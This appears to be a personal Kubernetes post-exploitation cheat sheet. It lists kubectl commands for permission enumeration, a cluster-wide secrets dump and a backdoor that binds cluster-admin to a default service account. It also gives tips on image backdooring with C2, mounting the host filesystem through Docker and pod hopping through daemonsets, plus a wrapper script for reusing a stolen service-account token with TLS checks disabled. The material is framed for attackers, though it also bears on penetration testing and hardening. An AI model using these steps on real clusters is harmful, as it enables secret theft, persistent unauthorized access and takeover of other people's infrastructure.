[*] Commands for kubernetes capabilities
	kubectl auth can-i '*' '*'
	kubectl auth can-i --list --namespace=foo
	kubectl auth can-i create pods
	kubectl auth can-i list pods
	kubectl get nodes

[*] Commands to pull secrets
        kubectl get secrets --all-namespaces
	kubectl describe secrets --all-namespace
		you can also limit namespaces to --namespace foo

[*] Kubernetes Backdoor access
	kubectl create clusterrolebinding <service> --clusterrole cluster-admin --serviceaccount=default:default
		Give a vulnerable pod clusterrole perm in default namespaces
		Use any name you want for <service>, this is not dependant on anything at this point.
		serviceacounts may be listed from an admin kubectl by running:
			kubectl get serviceaccounts --all-namespaces
		Example:
			kubectl create clusterrolebinding get-schwifty --clusterrole cluster-admin --serviceaccount=namespace-name:default

[*] Get current pod capabilities and/or how deployed
	kubectl get pods
	kubectl get pods --all-namespaces
		this may not work if you are limited to your own namespace
	kubectl describe pod <hostname> --namespace <your namespace>
        kubectl describe pod <hostname> --namespace <your namespace> -o yaml
		if the command exists, run "hostname" or "hostnamectl" to get your pod name. /etc/hosts should have this as well.
		Very useful to find where the image is stored. IF you can compromise the image and image pull policy is "Always",
		then you have potential for pod takeover whereever this image is deployed as a container. Integrate C2 backdoor.

[*] Tricks
	Assuming you find RCE on vulnerable pod upload kubectl binary to pod and start running above commands
	Don't forget about Docker. Some clusters will have Docker installed. Use Docker to mount host file system.

[*] Backdoor images and configs
	

[*] Useful content to learn kubernetes hacking
	https://www.youtube.com/watch?v=KSBs_8ZGPvs

[*] Recon and Enumeration
	On Node:
		Kubelet Credentials
		Neighboring Pods' service acounts
	Know your Nodes
		What pods run on your node?
			Apps
			Add-ons (Prometheus, istio)
			System (kube-proxy, coredns)
		Permissions blind spot: system and addon pods
			Daemonsets on all nodes
				Compromising a pod creates a privilege escalation scenario of pod hopping.
				Daemonsets run on all nodes. Compromise a daemonset, you have access to all nodes.

	Trampoline pods:
		Manipulate Authn/Authz
			Update roles of current tokens to obtain more access
		Aquire Tokens
			Service Account tokens that can be abused to further permissions
		Execute code (Remote Code Execution)
			Self explantory, can I get RCE on another more privileged pod?
		Steal pods
			Force a pod to move around that we know can be abused.
			If I own a node, can I get a more privileged pod to move to my compromised node?


[*] ktokctl.sh:
	#!/bin/bash
	set -e
	apiserver=$(cat /var/lib/kubectl/kubeconfig | grep 'server: ' | awk '{printf $2}')
	token=SERVICEACCOUNTTOKEN
	kubectl --token $token --server $apiserver --insecure-skip-tls-verify "$@"

	Example:
		ktokctl.sh auth can-i escalate clusterroles
		ktokctl.sh auth can-i "*" "*" -A
